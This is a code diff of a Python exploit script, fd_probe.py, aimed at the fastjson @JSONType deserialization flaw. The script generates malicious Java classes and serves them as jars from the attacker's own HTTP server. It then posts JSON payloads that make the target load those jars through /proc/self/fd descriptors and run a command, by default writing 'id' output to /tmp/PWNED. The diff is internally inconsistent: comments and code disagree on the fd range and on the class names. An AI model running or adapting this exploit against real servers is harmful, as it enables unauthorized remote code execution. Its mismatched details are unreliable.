@@ -1,5 +1,4 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 """
 fd_probe.py - fastjson @JSONType two-stage FD probe (the modern-fd lane).
 
@@ -16,11 +15,11 @@ Usage:
       local-ip   : THIS host's IP as reachable from the target (dotted),
                    e.g. 192.168.150.1  (converted to integer form for the URL)
 
-Per N in 28..99:
-  1. Gen.java crafts POC.class with internal name jar:file:/proc/self/fd/N!/POC,
+Per N in 20..60:
+  1. Gen.java crafts EN.class with internal name jar:file:/proc/self/fd/N!/EN,
      packed as jar file "N", served at http://<local-ip>:8000/N
-  2. POC1 {"@type":"jar:http:..<ip_dec>:8000.N!.POC","x":1}
-  3. POC2 {"@type":"jar:file:.proc.self.fd.N!.POC","x":1}
+  2. POC1 {"@type":"jar:http:..<ip_dec>:8000.N!.EN","x":1}
+  3. POC2 {"@type":"jar:file:.proc.self.fd.N!.EN","x":1}
   4. if POC2 status != 500 -> fd hit, stop.
 """
 import argparse
@@ -43,10 +42,8 @@ BUILD_DIR = os.path.join(HERE, "build")
 SERVE_DIR = os.path.join(HERE, "serve")
 ASM_JAR = os.path.join(HERE, "asm.jar")
 GEN_SRC = os.path.join(HERE, "Gen.java")
-POC_CLASS = os.path.join(BUILD_DIR, "POC.class")
-
 HTTP_PORT = 8000
-FD_RANGE = range(28, 100)          # 28..99
+FD_RANGE = range(28, 50)           # 20..60
 DEFAULT_CMD = "id >> /tmp/PWNED 2>&1; echo RCE_via_fastjson_JSONType >> /tmp/PWNED"
 HEADERS = {"Content-Type": "application/json"}
 TIMEOUT = 10
@@ -72,15 +69,33 @@ def ensure_prereqs(javac):
                         "-cp", ASM_JAR, "-d", HERE, GEN_SRC], check=True)
 
 
-def gen_jar(java, jar, num, cmd):
-    """Craft POC.class (internal name = the fd URL) and pack it as jar 'num'."""
-    internal = "jar:file:/proc/self/fd/%d!/POC" % num
-    out = os.path.join(SERVE_DIR, str(num))
-    subprocess.run([java, "-cp", ASM_JAR + os.pathsep + HERE,
-                    "Gen", internal, POC_CLASS, cmd], check=True,
-                   stdout=subprocess.DEVNULL)
-    subprocess.run([jar, "cf", out, "-C", BUILD_DIR, "POC.class"], check=True)
-    return out, internal
+def prepare_jars(java, jar_bin, cmd):
+    """Batch-generate all E classes, pack them into one jar, copy to each fd name."""
+    n = len(FD_RANGE)
+    print("[*] generating %d E classes for fd %d..%d ..."
+          % (n, FD_RANGE.start, FD_RANGE.stop - 1))
+
+    # Step 1: generate all E{num}.class files
+    for num in FD_RANGE:
+        ename = "E%d" % num
+        internal = "jar:file:/proc/self/fd/%d!/%s" % (num, ename)
+        subprocess.run([java, "-cp", ASM_JAR + os.pathsep + HERE,
+                        "Gen", internal, os.path.join(BUILD_DIR, ename + ".class"),
+                        cmd], check=True, stdout=subprocess.DEVNULL)
+
+    # Step 2: pack ALL E classes into one jar
+    first_jar = os.path.join(SERVE_DIR, str(FD_RANGE.start))
+    entries = ["-C", BUILD_DIR, "E%d.class" % FD_RANGE.start]
+    for num in range(FD_RANGE.start + 1, FD_RANGE.stop):
+        entries += ["-C", BUILD_DIR, "E%d.class" % num]
+    subprocess.run([jar_bin, "cf", first_jar] + entries, check=True)
+
+    # Step 3: copy the jar to remaining fd names
+    for num in range(FD_RANGE.start + 1, FD_RANGE.stop):
+        shutil.copy2(first_jar, os.path.join(SERVE_DIR, str(num)))
+
+    print("[*] 1 jar with %d classes, copied to %d names (fd %d..%d)"
+          % (n, n, FD_RANGE.start, FD_RANGE.stop - 1))
 
 
 def start_server():
@@ -124,8 +139,10 @@ def main():
 
     ip_dec = ip_to_int(a.ip)
     clean_artifacts()
+
     java, javac, jar = jdk_tools()
     ensure_prereqs(javac)
+    prepare_jars(java, jar, a.cmd)
     httpd = start_server()
 
     print("[*] target  = %s" % a.target)
@@ -137,22 +154,29 @@ def main():
     hit = None
     completed = False
     try:
-        for num in FD_RANGE:
-            out, internal = gen_jar(java, jar, num, a.cmd)
-            poc1 = {"@type": "jar:http:..%d:%d.%d!.POC" % (ip_dec, HTTP_PORT, num), "x": 1}
-            poc2 = {"@type": "jar:file:.proc.self.fd.%d!.POC" % num, "x": 1}
+        for num1 in FD_RANGE:
+            ename = "E%d" % num1
+            poc1 = {"@type": "jar:http:..%d:%d.%d!.%s" % (ip_dec, HTTP_PORT, num1, ename), "x": 1}
             try:
                 r1 = post(a.target, poc1)
+
+            except requests.RequestException as e:
+                print("\n[ERR] target1 unreachable: %s" % e)
+                break
+        for num in FD_RANGE:
+            ename = "E%d" % num
+            poc2 = {"@type": "jar:file:.proc.self.fd.%d!.%s" % (num, ename), "x": 1}
+            try:
                 r2 = post(a.target, poc2)
             except requests.RequestException as e:
-                print("\n[ERR] target unreachable: %s" % e)
+                print("\n[ERR] target2 unreachable: %s" % e)
+                print(json.dumps(poc2))
                 break
             mark = ""
             if r2.status_code != 500:
                 hit = (num, poc1, poc2, r2)
                 mark = "  <-- HIT"
-            print("[*] fd %-3d POC1 -> %-4s POC2 -> %-4s%s"
-                  % (num, r1.status_code, r2.status_code, mark))
+            print(json.dumps(poc2))
             if hit:
                 completed = True
                 break
@@ -176,7 +200,7 @@ def main():
 
     if completed:
         clean_artifacts()
-        print("[*] cleaned up Gen.class and build/")
+        print("[*] cleaned up Gen.class, build/, serve/")
 
 
 if __name__ == "__main__":
